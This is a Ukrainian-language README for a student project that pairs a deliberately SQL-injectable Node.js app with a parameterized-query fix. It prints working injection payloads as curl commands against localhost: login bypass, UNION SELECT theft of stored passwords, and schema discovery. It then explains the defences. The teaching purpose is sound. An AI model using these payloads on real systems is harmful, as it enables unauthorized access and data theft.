# SQL Injection: атака та засоби захисту

Навчально-дослідницька робота (тема 6): **«Атака на основі SQL Injection та засоби захисту від неї»**.

Автори:

**Дар'я Мельник** - Frontend розробниця
**Анастасія Трекурова** - Аналітикиня-дослідниця

Репозиторій містить два невеликих Node.js-застосунки з однаковою логікою та однаковою базою даних:

| Застосунок | Папка | Порт | Призначення |
|---|---|---|---|
| Вразливий | [`payload/1-vulnerable-app`](payload/1-vulnerable-app) | **3000** | SQL-запити будуються конкатенацією рядків, тому застосунок вразливий до SQL Injection |
| Захищений | [`payload/2-secure-app`](payload/2-secure-app) | **3001** | ті самі маршрути, але з параметризованими запитами (Prepared Statements) |

> ⚠️ **Застереження.** Проєкт навмисно містить вразливий код і призначений **лише для навчання** на локальній машині. Не розгортайте `1-vulnerable-app` на публічному сервері й не використовуйте описані техніки проти чужих систем.

## Швидкий старт

Потрібні Node.js та npm. Застосунки незалежні, тому запускайте їх у двох окремих терміналах.

**Вразливий застосунок (порт 3000):**

```bash
cd payload/1-vulnerable-app
npm install
npm start
```

**Захищений застосунок (порт 3001):**

```bash
cd payload/2-secure-app
npm install
npm start
```

Після запуску:

- http://localhost:3000 — тестова сторінка з формами (лише у вразливій версії)
- `POST /login` та `GET /search` доступні в обох застосунках

Кожен запит виводиться в консоль сервера (`[SQL LOGIN QUERY]`, `[SECURE SQL SEARCH]` тощо). Це зручно для демонстрації під час доповіді.

## Демонстрація атак (вразливий застосунок, порт 3000)

Приклади з `curl`. Те саме можна ввести у форми на http://localhost:3000.

### 1. Обхід авторизації (Authentication Bypass)

Вхід під `admin` без пароля:

```bash
curl -X POST http://localhost:3000/login \
  --data-urlencode "login=admin' --" \
  --data-urlencode "password=будь-що"
```

Інший варіант — тавтологія `OR '1'='1'`:

```bash
curl -X POST http://localhost:3000/login \
  --data-urlencode "login=' OR '1'='1' --" \
  --data-urlencode "password=x"
```

**Результат:** сервер повертає `Успішний вхід!` і всі дані першого користувача, тобто `admin`, разом з `password` та `secret_note`.

### 2. Витік даних через UNION SELECT

Таблиця `products` має 3 стовпці (`id`, `title`, `price`). Ця кількість стовпців потрібна для `UNION`. Логіни та паролі з `users` виводяться у полях `title` та `price`:

```bash
curl -G http://localhost:3000/search \
  --data-urlencode "q=' UNION SELECT id, login, password FROM users --"
```

Секретна нотатка адміна:

```bash
curl -G http://localhost:3000/search \
  --data-urlencode "q=' UNION SELECT id, secret_note, 0 FROM users WHERE role='admin' --"
```

Список таблиць бази (розвідка схеми через `sqlite_master`):

```bash
curl -G http://localhost:3000/search \
  --data-urlencode "q=' UNION SELECT 1, name, 0 FROM sqlite_master WHERE type='table' --"
```

### 3. Error-based розвідка

Одинарна лапка ламає синтаксис запиту:

```bash
curl -X POST http://localhost:3000/login \
  --data-urlencode "login='" \
  --data-urlencode "password=x"
```

Вразливий сервер повертає `500` разом із текстом помилки БД та повним `executed_query`. Це допомагає зловмисникові зрозуміти структуру запиту.

## Захист (захищений застосунок, порт 3001)

Ті самі запити, спрямовані на порт **3001**, не працюють:

```bash
curl -X POST http://localhost:3001/login \
  --data-urlencode "login=admin' --" \
  --data-urlencode "password=x"
# → 401 «Невірний логін або пароль (атаку заблоковано)»

curl -G http://localhost:3001/search \
  --data-urlencode "q=' UNION SELECT id, login, password FROM users --"
# → results: [] (рядок шукається як буквальна назва товару)
```

Легітимні запити працюють як звичайно:

```bash
curl -X POST http://localhost:3001/login -d "login=student&password=12345"
curl -G http://localhost:3001/search --data-urlencode "q=миша"
```

### Що змінено в коді

| | Вразлива версія | Захищена версія |
|---|---|---|
| Логін | `"... WHERE login = '" + login + "' AND password = '" + password + "'"` | `"... WHERE login = ? AND password = ?"` + `db.get(query, [login, password], ...)` |
| Пошук | `"... LIKE '%" + q + "%'"` | `"... LIKE ?"` + параметр `` `%${q}%` `` |
| Вибірка при логіні | `SELECT *` (разом із `password`) | `SELECT id, login, role, secret_note` (без пароля) |
| Відповідь на помилку | Повертає `err.message` та повний SQL-запит | Повертає загальне повідомлення (поле `error` залишається для налагодження) |
| Пароль у відповіді | — | `params: [login, '***']` |

### Чому це працює

При використанні плейсхолдерів `?` драйвер передає SQL-команду та значення **окремо**. СУБД спершу розбирає структуру запиту, а значення підставляє вже після цього, і вони не можуть змінити його логіку. Рядок `admin' --` стає просто значенням поля `login`.

### Додаткові рекомендації щодо захисту

Цей проєкт демонструє головний захист — параметризовані запити. У реальних системах його доповнюють такими заходами:

- **Валідація й нормалізація вхідних даних** (тип, довжина, формат) на сервері.
- **Принцип найменших привілеїв:** акаунт застосунку в БД має мати лише потрібні права.
- **ORM або query builder** (Sequelize, Knex, Prisma), які використовують параметризацію за замовчуванням.
- **Не показувати помилки БД клієнту:** деталі лише в серверних логах.
- **Хешування паролів** (bcrypt / argon2) замість зберігання у відкритому вигляді. У навчальних даних паролі зберігаються відкрито лише для наочності.
- **WAF та моніторинг** підозрілих запитів як додатковий шар (не замінює параметризацію).
- Для динамічних імен таблиць чи стовпців, які не можна параметризувати, застосовувати **білий список** дозволених значень.

## Порівняння версій

| Атака | Вразлива (3000) | Захищена (3001) |
|---|---|---|
| `admin' --` у логіні | ✅ вхід без пароля | ❌ 401, атаку заблоковано |
| `' OR '1'='1' --` | ✅ вхід як перший користувач | ❌ 401 |
| `UNION SELECT` у пошуку | ✅ витік даних із `users` | ❌ порожній результат |
| Одинарна лапка `'` | 💥 500 + текст помилки + SQL | ✅ звичайна відповідь без помилки |
